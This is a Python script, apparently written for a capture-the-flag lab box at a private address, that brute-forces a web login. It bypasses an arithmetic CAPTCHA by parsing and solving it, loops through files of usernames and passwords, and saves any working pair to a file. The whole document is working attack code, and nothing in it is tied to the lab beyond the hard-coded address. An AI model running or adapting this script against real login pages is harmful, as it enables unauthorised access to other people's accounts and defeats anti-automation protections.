import requests
import re
import time

URL = "http://10.10.49.39/login"

def solve_captcha(html):
    match = re.search(r'(\d+)\s*([-+*/])\s*(\d+)', html)
    if not match:
        return None

    a = int(match.group(1))
    op = match.group(2)
    b = int(match.group(3))

    if op == '+':
        return a + b
    elif op == '-':
        return a - b
    elif op == '*':
        return a * b
    elif op == '/':
        return a // b if b != 0 else None
    return None

def attempt_login(username, password):
    session = requests.Session()

    # Trigger CAPTCHA
    fake = session.post(URL, data={
        "username": "fake",
        "password": "fake",
        "captcha": "1"
    })

    captcha_html = fake.text
    captcha = solve_captcha(captcha_html)
    if captcha is None:
        print(f"[!] CAPTCHA not solved for {username}:{password}")
        return False

    data = {
        "username": username,
        "password": password,
        "captcha": str(captcha)
    }

    try:
        r = session.post(URL, data=data)
    except Exception as e:
        print(f"[!] Error with {username}:{password} — {e}")
        return False

    # Analyze response
    if "Invalid captcha" in r.text:
        return False
    elif "Invalid password" in r.text:
        return False
    elif f"The user '{username}' does not exist" in r.text or f"The user &#39;{username}&#39; does not exist" in r.text:
        return False
    elif "Intranet login" not in r.text:
        return "success"
    else:
        return False

def main():
    try:
        with open("valid_usernames.txt") as uf:
            usernames = [u.strip() for u in uf if u.strip()]
        with open("passwords.txt") as pf:
            passwords = [p.strip() for p in pf if p.strip()]
    except Exception as e:
        print(f"[!] Error reading files: {e}")
        return

    for username in usernames:
        print(f"\n[~] Starting brute-force for user: {username}")
        for password in passwords:
            print(f"[~] Trying {username}:{password}")
            result = attempt_login(username, password)
            time.sleep(1.5)

            if result == "success":
                print(f"[!!!] VALID CREDENTIALS: {username}:{password}")
                with open("valid_credentials.txt", "a") as f:
                    f.write(f"{username}:{password}\n")
                break

if __name__ == "__main__":
    main()
